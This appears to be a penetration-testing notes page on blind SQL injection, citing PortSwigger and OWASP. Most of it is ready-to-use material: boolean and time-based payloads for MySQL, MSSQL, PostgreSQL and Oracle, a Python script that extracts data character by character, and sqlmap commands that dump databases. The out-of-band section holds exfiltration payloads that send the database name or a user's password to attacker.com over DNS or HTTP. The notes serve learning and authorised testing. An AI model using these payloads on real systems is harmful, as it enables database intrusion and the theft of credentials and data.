# Blind SQL Injection

← [[SQLi-Overview]]

---

Blind SQLi is when the database returns no visible output and no error messages. You're flying blind — but you can still extract data by asking true/false questions (boolean-based) or measuring response time (time-based).

---

## Boolean-Based Blind SQLi

Ask the database a yes/no question. True = normal response. False = different response (missing content, different message, different length).

### Confirm It's Exploitable

```sql
-- True condition → normal response
' AND 1=1--

-- False condition → different response
' AND 1=2--
```

If `1=1` and `1=2` give different responses, you can extract data bit by bit.

### Extract Data Character by Character

```sql
-- Is the first character of the database name 'a'?
' AND SUBSTRING((SELECT database()), 1, 1) = 'a'--

-- Binary search approach (faster):
' AND ASCII(SUBSTRING((SELECT database()), 1, 1)) > 109--  ← is it > 'm'?
' AND ASCII(SUBSTRING((SELECT database()), 1, 1)) > 115--  ← is it > 's'?
' AND ASCII(SUBSTRING((SELECT database()), 1, 1)) = 115--  ← is it exactly 's'?
```

### Full Extraction Loop (Conceptual)

```python
import requests

def extract_char(position, query):
    for char_code in range(32, 127):  # printable ASCII
        payload = f"' AND ASCII(SUBSTRING(({query}),{position},1))={char_code}--"
        r = requests.get(url, params={'id': '1' + payload})
        if "Welcome" in r.text:  # true condition indicator
            return chr(char_code)
    return None

# Extract DB name
db_name = ""
for i in range(1, 20):
    c = extract_char(i, "SELECT database()")
    if c:
        db_name += c
    else:
        break
print(db_name)
```

In practice, use sqlmap for this — doing it manually is only for understanding.

---

## Time-Based Blind SQLi

No response difference at all? Use time delays. If the condition is true, the database sleeps.

### MySQL — SLEEP()

```sql
-- True → response takes 5+ seconds
' AND SLEEP(5)--

-- Conditional: if first char of DB name is 's', sleep
' AND IF(SUBSTRING(database(),1,1)='s', SLEEP(5), 0)--

-- More precise: ASCII binary search
' AND IF(ASCII(SUBSTRING(database(),1,1))>109, SLEEP(5), 0)--
```

### MSSQL — WAITFOR DELAY

```sql
'; WAITFOR DELAY '0:0:5'--
'; IF (SELECT COUNT(*) FROM users WHERE username='admin')>0 WAITFOR DELAY '0:0:5'--
```

### PostgreSQL — pg_sleep()

```sql
'; SELECT pg_sleep(5)--
'; SELECT CASE WHEN (SELECT username FROM users LIMIT 1)='admin' THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

### Oracle

```sql
'; SELECT DBMS_PIPE.RECEIVE_MESSAGE(('a'),5) FROM DUAL--
'; SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE(('a'),5) ELSE NULL END FROM DUAL--
```

---

## Out-of-Band Blind SQLi

Instead of reading the response, the database makes an outgoing request with the data in it.

### MySQL — LOAD_FILE / INTO OUTFILE (requires FILE privilege)

```sql
-- DNS exfiltration (requires UNC path support, Windows MySQL mostly)
' AND LOAD_FILE(concat('\\\\',database(),'.attacker.com\\a'))--
```

### MSSQL — xp_cmdshell / DNS lookup

```sql
'; EXEC master..xp_dirtree '\\'+database()+'.attacker.com\a'--
```

### Oracle — UTL_HTTP

```sql
'; SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE rownum=1)) FROM dual--
```

Use [[Burp-Suite/Burp-Overview|Burp Collaborator]] as your listener for out-of-band exfiltration.

---

## Automating Blind SQLi

Manual blind extraction is extremely slow (one character = ~7 requests with binary search). Always use sqlmap:

```bash
# Detect and exploit blind SQLi
sqlmap -u "https://example.com/page?id=1" --batch --level=3

# Force time-based technique
sqlmap -u "https://example.com/page?id=1" --technique=T --batch

# Force boolean-based
sqlmap -u "https://example.com/page?id=1" --technique=B --batch

# Dump with threads for speed
sqlmap -u "https://example.com/page?id=1" --dump --threads=10 --batch
```

---

## Tips for Hard-to-Detect Cases

**Response looks identical?**
- Compare response *length* not just content — sometimes a single byte differs
- Try `SLEEP()` — unambiguous
- Use Burp Comparer on two responses

**Time-based unreliable?**
- Network latency can mask a 1-2s sleep. Use `SLEEP(10)` or `SLEEP(15)`
- Run multiple times to confirm consistency

**Both techniques fail?**
- Try out-of-band (needs specific DB + privilege)
- Look for other entry points — maybe a different parameter has visible output

---

*Back to [[SQLi-Overview]] | Related: [[Error-Based-SQLi]] | [[SQLi-to-RCE]]*

*Sources: PortSwigger Web Security Academy, OWASP Testing Guide v4*
